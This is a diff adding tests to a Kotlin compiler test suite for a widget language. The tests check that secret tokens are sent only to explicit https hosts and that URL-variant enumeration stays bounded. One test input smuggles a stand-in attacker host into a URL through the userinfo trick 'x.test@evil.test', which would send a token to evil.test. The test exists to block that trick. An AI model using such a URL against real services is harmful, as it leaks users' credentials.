@@ -346,6 +346,9 @@ class LangTest {
         compileError(w + " state h = \"x.test\"\n source s = http(\"https://${'$'}{h}/a\", {A: token})\n Text { text: 1 } }").let { assertTrue(it, it.contains("server it goes to is written out")) }
         compileError(w + " state u = \"https://x.test\"\n onTap: post(u, {t: token})\n Text { text: 1 } }").let { assertTrue(it, it.contains("server it goes to is written out")) }
         assertEquals(listOf("https://x.test:8443"), Compiler.compile(w + " onTap: post(\"https://X.test:8443\", {t: token})\n Text { text: 1 } }").secretHosts["token"])
+        compileError(w + " onTap: post(\"http://x.test/a\", {t: token})\n Text { text: 1 } }").let { assertTrue(it, it.contains("only to an https:// server")) }
+        // A user name before the host would bind it to "x.test@evil.test", and send it to evil.test.
+        compileError(w + " onTap: post(\"https://x.test@evil.test/a\", {t: token})\n Text { text: 1 } }").let { assertTrue(it, it.contains("server it goes to is written out")) }
         compileError("widget {\n meta { owl: 12 }\n state token = null secret persist\n Text { text: 1 } }").let { assertTrue(it, it.contains("without persist")) }
         compileError("widget {\n meta { owl: 11 }\n state token = null secret\n Text { text: 1 } }").let { assertTrue(it, it.contains("secret needs owl 12")) }
     }
@@ -1263,6 +1266,9 @@ class LangTest {
         for (bad in listOf("\"https://${'$'}{enc(v)}/x\"", "\"https://a.b${'$'}{enc(v)}/x\"", "\"https://a.b/${'$'}{v}\"", "\"https://a.b/${'$'}{sh(v)}\"", "\"${'$'}{enc(v)}\"", "n > 1 ? null : null")) {
             assertEquals(bad, listOf("http GET (a URL built from widget values)"), commands(bad))
         }
+        // More ways than are listed, given up on as they add up: 2^30 strings would fill memory first.
+        val many = "${'$'}{n > 1 ? \"a\" : \"b\"}".repeat(30)
+        assertEquals(listOf("http GET (a URL built from widget values)"), commands("\"https://a.b/$many\""))
     }
 
     @Test fun urlValuesNotThroughEncAreWarnedAboutWithTheFix() {
